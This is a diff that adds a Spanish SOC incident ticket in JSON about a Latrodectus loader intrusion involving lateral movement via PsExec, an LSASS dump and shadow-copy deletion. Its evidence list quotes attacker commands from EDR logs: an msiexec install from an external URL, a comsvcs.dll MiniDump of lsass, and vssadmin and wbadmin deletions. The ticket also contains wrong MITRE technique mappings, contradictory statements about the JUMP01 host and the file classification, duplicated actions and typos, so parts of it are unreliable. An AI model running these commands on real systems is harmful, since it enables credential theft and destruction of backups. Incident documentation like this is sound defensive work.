@@ -1,0 +1,305 @@
+{
+  "ticket_id": "SOC-INC-9E5D8C1728B2",
+  "alert_ids": [
+    "ALR-20261010-011797",
+    "ALR-20261010-011798"
+  ],
+  "title": "Cadena correlacionada y confirmada: user_host",
+  "verdict": "true_positive",
+  "confidence": 0.85,
+  "severity": "critical",
+  "severity_rationale": "Severidad oficial del incidente: máximo de los tickets N1 calculados con matriz SOC (critical). Sin ajustes extra por correlación.",
+  "affected": {
+    "users": [
+      "adm.aortega@tarvia.example",
+      "adm.aortega@tarvia.example (cuenta privilegiada, solo autorizada desde JUMP01; usada aquí desde WS-BCN-1770)",
+      "marta.puig@tarvia.example (propietaria del puesto WS-BCN-1770, origen del ataque)"
+    ],
+    "hosts": [
+      "WS-BCN-1770",
+      "FS01",
+      "FS01 (10.20.2.20) - Servidor de ficheros, criticidad Alta, zone DC-SERVERS, servicio: Unidades compartidas (Finanzas, Compras, Personas)",
+      "WS-BCN-1770 (10.10.3.95) - Portátil Windows 11, criticidad Media, HQ-USERS, origen del malware",
+      "PRINT01 (10.20.6.63) - Servidor de impresión, criticidad Baja"
+    ],
+    "business_services": [
+      "evaluacion_criticidad_pendiente_FS01",
+      "Unidades compartidas (Finanzas, Compras, Personas)"
+    ],
+    "customers": [
+      "N/A - no hay evidencia de datos de cliente",
+      "No confirmada exfiltración (ver límites)"
+    ]
+  },
+  "summary": "Agrupación validada por analista: INC-9E5D8C1728B2. Evidencias de 2 alertas conservadas abajo. Causalidad según registro de revisión humana.",
+  "evidence": [
+    {
+      "source": "FW-0025321",
+      "event_id": "FW-0025321",
+      "finding": "pendiente_de_recuperacion_logs"
+    },
+    {
+      "source": "EDR-0123413",
+      "event_id": "EDR-0123413",
+      "finding": "pendiente_de_recuperacion_logs"
+    },
+    {
+      "source": "EDR-0123414",
+      "event_id": "EDR-0123414",
+      "finding": "pendiente_de_recuperacion_logs"
+    },
+    {
+      "source": "CMDB",
+      "event_id": "consultar_activo_FS01",
+      "finding": "pendiente_de_recuperacion"
+    },
+    {
+      "source": "CMDB",
+      "event_id": "consultar_activo_WS-BCN-1770",
+      "finding": "pendiente_de_recuperacion"
+    },
+    {
+      "source": "Directorio",
+      "event_id": "consultar_usuario_adm.aortega",
+      "finding": "pendiente_de_recuperacion"
+    },
+    {
+      "source": "TIP/Inteligencia",
+      "event_id": "consultar_inteligencia_svchelper.exe",
+      "finding": "pendiente_de_recuperacion"
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123415",
+      "finding": "vssadmin.exe delete shadows /all /quiet en FS01 (padre svchelper.exe). Base de la alerta; EDR action=blocked."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123416",
+      "finding": "wbadmin delete catalog -quiet en FS01 (padre svchelper.exe)."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123414",
+      "finding": "svchelper.exe malicioso (sha256 70aa203e2e17260ab3f760a84404b9c9ace4397d7d0b8e4713534f40b1353c44, sin firma) en C:\\ProgramData\\svchelper.exe, padre PSEXESVC.exe, integridad System en FS01 - despliegue de malware lateral."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123435",
+      "finding": "spoolhlp.exe (mismo sha256 70aa...) en C:\\Windows\\Temp\\spoolhlp.exe en PRINT01, padre PSEXESVC.exe - movimiento lateral."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123413",
+      "finding": "Instalación del servicio PSEXESVC en FS01 con remote_host WS-BCN-1770, cuenta TARVIA\\adm.aortega - movimiento lateral vía PsExec con cuenta adm."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123412",
+      "finding": "rundll32.exe comsvcs.dll MiniDump de lsass.exe (pid 708) → C:\\ProgramData\\l.dmp, usuario NT AUTHORITY\\SYSTEM en WS-BCN-1770 - robo confirmado de credenciales."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123404",
+      "finding": "registry_set HKCU\\...\\Run\\Update con rundll32.exe upd_x64.dll - persistencia en WS-BCN-1770."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123403",
+      "finding": "rundll32.exe \"...\\Custom_update\\upd_x64.dll\",homq en WS-BCN-1770 - ejecución del loader."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123401",
+      "finding": "msiexec.exe /q /i https://aplihartom.com/dl/upd.msi en WS-BCN-1770 - vector de infección (URL externa)."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123402",
+      "finding": "file_create upd_x64.dll (sin firma) en C:\\Users\\marta.puig\\AppData\\Roaming\\Custom_update - dropper."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123405",
+      "finding": "whoami.exe /all en WS-BCN-1770 - reconocimiento."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123406",
+      "finding": "net group 'Domain Admins' /domain en WS-BCN-1770 - enumeración de grupos privilegiados."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123410",
+      "finding": "adf.exe consulta LDAP '(objectcategory=computer)' en WS-BCN-1770 - recolección de objetos de equipo."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123411",
+      "finding": "net group 'Enterprise Admins' /domain en WS-BCN-1770 - enumeración de grupos de alto privilegio."
+    }
+  ],
+  "enrichment": [
+    {
+      "indicator": "70aa203e2e17260ab3f760a84404b9c9ace4397d7d0b8e4713534f40b1353c44",
+      "type": "sha256",
+      "source": "TIP_interno",
+      "result": "pendiente_de_recuperacion"
+    },
+    {
+      "indicator": "10.10.3.95",
+      "type": "ip",
+      "source": "TIP_interno",
+      "result": "pendiente_de_recuperacion"
+    },
+    {
+      "indicator": "10.20.2.20",
+      "type": "ip",
+      "source": "TIP_interno",
+      "result": "pendiente_de_recuperacion"
+    },
+    {
+      "indicator": "sha256 0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697 (upd_x64.dll)",
+      "type": "TIP",
+      "source": "consultar_inteligencia",
+      "result": "MALICIOUS - familia Latrodectus (loader/dll), confidence 75, first_seen 2026-10-06."
+    },
+    {
+      "indicator": "sha256 70aa203e2e17260ab3f760a84404b9c9ace4397d7d0b8e4713534f40b1353c44 (svchelper.exe/spoolhlp.exe)",
+      "type": "TIP",
+      "source": "consultar_inteligencia",
+      "result": "DESCONOCIDO (sin coincidencias en TIP); no es limpio por defecto. Contexto (sin firma, ProgramData/Temp, masca-ra como svchelper, despliegue vía PsExec, mismo hash en dos equipos) lo indica malicioso."
+    },
+    {
+      "indicator": "https://aplihartom.com/dl/upd.msi",
+      "type": "TIP",
+      "source": "consultar_inteligencia",
+      "result": "DESCONOCIDO (sin coincidencias en TIP); no es limpio por defecto."
+    },
+    {
+      "indicator": "usuario adm.aortega",
+      "type": "directorio",
+      "source": "consultar_usuario",
+      "result": "admin, privilegiada, MFA FIDO2; nota: 'Solo debe usarse desde JUMP01'. Usada aquí desde WS-BCN-1770."
+    },
+    {
+      "indicator": "activo FS01",
+      "type": "CMDB",
+      "source": "consultar_activo",
+      "result": "A01156, Servidor de ficheros Windows Server 2019, criticidad Alta, DC-SERVERS, servicio Unidades compartidas (Finanzas, Compras, Personas), internet_facing=False; CVE-2024-38063 (9.8) abierto."
+    }
+  ],
+  "mitre": [
+    "T1021.002 (SMB/Windows Admin Shares)",
+    "T1021 (Lateral Movement)",
+    "T1566 (infección inicial)",
+    "T1059.006/TS-01001 (ejecución rundll32/loader)",
+    "T1053.005 (persistencia registro)",
+    "T1003.001 (robo credenciales LSASS)",
+    "T1083 (discovery)",
+    "T1021.001 (lateral movement PsExec)",
+    "T1570 (despliegue herramientas lateral)",
+    "T1490 (inhibit system recovery)"
+  ],
+  "recommended_actions": [
+    {
+      "action": "Escalar a N2 en la misma jornada (severidad >= high: escalado obligatorio por movimiento lateral con cuenta privilegiada y sin cambio aprobado).",
+      "target": "N2_Guardia",
+      "requires_approval": false,
+      "justification": "Escalado obligatorio por compromiso de movimiento lateral confirmado y uso no autorizado de cuenta adm.*"
+    },
+    {
+      "action": "Proponer aislamiento del puesto de trabajo WS-BCN-1770 (origen de la conexión) para contención, pendiente de aprobación N2.",
+      "target": "WS-BCN-1770",
+      "requires_approval": true,
+      "justification": "Impedir continuidad del movimiento lateral"
+    },
+    {
+      "action": "Proponer revocación de sesiones y forzar cambio de contraseña para adm.aortega si se confirma uso no autorizado, pendiente de aprobación N2.",
+      "target": "adm.aortega",
+      "requires_approval": true,
+      "justification": "Posible compromiso de cuenta privilegiada"
+    },
+    {
+      "action": "Analizar el archivo C:\\ProgramData\\svchelper.exe (hash 70aa...) en sandbox/EDR antes de clasificar como malicioso o legítimo.",
+      "target": "svchelper.exe",
+      "requires_approval": false,
+      "justification": "Determinar si existe código malicioso detrás de la ejecución"
+    },
+    {
+      "action": "Verificar con IT que adm.aortega no ejecutó una tarea administrativa autorizada sin registrar el change_ticket.",
+      "target": "IT_Operaciones",
+      "requires_approval": false,
+      "justification": "Descartar benign_true_positive"
+    },
+    {
+      "action": "Escalar inmediatamente a N2 de guardia por teléfono y notificar a Responsable SOC y CISO (SLA critical 15 min). Activado por: true_positive critical + ejecución confirmada de código malicioso + robo confirmado de credenciales + movimiento lateral + precursor de ransomware.",
+      "target": "N2/CISO",
+      "requires_approval": false,
+      "justification": "Sección 5 del SOC: escalado obligatorio."
+    },
+    {
+      "action": "Aislar WS-BCN-1770 (origen del malware Latrodectus y de la cadena).",
+      "target": "workstation",
+      "requires_approval": true,
+      "justification": "Requiere aprobación N2 (propuesto por N1)."
+    },
+    {
+      "action": "Aislar FS01 y PRINT01 (malware desplegado y objetivo del borrado de sombras).",
+      "target": "server/print",
+      "requires_approval": true,
+      "justification": "Requiere N2 + dueño del servicio. FS01 es activo de criticidad Alta con datos de Finanzas/Compras/Personas."
+    },
+    {
+      "action": "Revocar sesiones de adm.aortega y forzar cambio de contraseña (cuenta abusada desde equipo no autorizado JUMP01; credenciales comprometidas por LSASS dump).",
+      "target": "cuenta",
+      "requires_approval": true,
+      "justification": "Requiere N2 (propuesto por N1)."
+    },
+    {
+      "action": "Bloquear en proxy/EDR los IOCs confirmados: sha256 0cfa0bdd... (Latrodectus), sha256 70aa203e... (svchelper/spoolhlp), URL https://aplihartom.com y el hash de upd.msi.",
+      "target": "IOC",
+      "requires_approval": false,
+      "justification": "Bloqueo de IOC permitido para N1 (no afecta servicios legítimos de uso dual)."
+    },
+    {
+      "action": "Verificar integridad y disponibilidad de copias de seguridad / shadow copies antes de reintentar cualquier borrado; confirmar backups de FS01 intactos.",
+      "target": "backups",
+      "requires_approval": false,
+      "justification": "El ataque buscaba inhibir la recuperación (T1490)."
+    },
+    {
+      "action": "Investigar el grupo candidato INC-9E5D8C1728B2 / ALR-20261010-011797 para confirmar si es una rama de la misma cadena; requiere N2. No fusionado en este ticket N1 (individual).",
+      "target": "correlación",
+      "requires_approval": false,
+      "justification": "Hipósis de grupo; corrobora con logs en N2."
+    }
+  ],
+  "executed_actions": [],
+  "escalation": {
+    "escalate": true,
+    "to": "N2",
+    "reason": "Cadena de eventos confirmada por analista."
+  },
+  "open_questions": [
+    "Critacidad y servicio de negocio de FS01 y WS-BCN-1770 (pendiente CMDB)",
+    "Validez y rol de adm.aortega, y si la cuenta tiene excepción documentada (pendiente Directorio)",
+    "Contenido real de FW-0025321, EDR-0123413, EDR-0123414: bloqueos (403/401), estado de la ejecución y proceso detrás del PSEXESVC (pendiente logs)",
+    "Resultado de inteligencia del hash svchelper.exe y de las IPs (pendiente TIP)",
+    "Existencia de any change_ticket que autorice esta operación de administración remota",
+    "¿Hubo exfiltración de datos de FS01? La ventana de proxy/firewall para FS01/PRINT01 no muestra eventos (ver límites), pero no se puede descartar canal alternativo.",
+    "Estado real de las shadow copies de FS01 tras el bloqueo del EDR (¿se aplicó el borrado pese al blocked?).",
+    "Extensión del compromiso de adm.aortega y otras cuentas privilegiadas exuestas en el LSASS dump.",
+    "Si el malware Latrodectus ya desplegó payload secundario (ransomware) en FS01."
+  ],
+  "triage_seconds": 227.07,
+  "origen": "consolidacion_determinista_n2",
+  "group_id": "INC-9E5D8C1728B2",
+  "confirmacion_manual": "resultados/v3/revisiones/INC-9E5D8C1728B2.json",
+  "firmas_tickets": {
+    "ALR-20261010-011797": "6a644d6c6520d7c3a4bf02382751b77b6025396b208ef7150662e74ce9f4b3a8",
+    "ALR-20261010-011798": "57f85730c86b34168ee20924650e7ff28ca783e4fcce86f661bce6dd9a51d63d"
+  },
+  "generado_utc": "2026-11-08T03:30:41.590525+00:00",
+  "advertencia": "Solo combina tickets existentes; no sustituye revisar la causalidad, el alcance completo ni incidentes que quedan fuera de la correlación."
+}
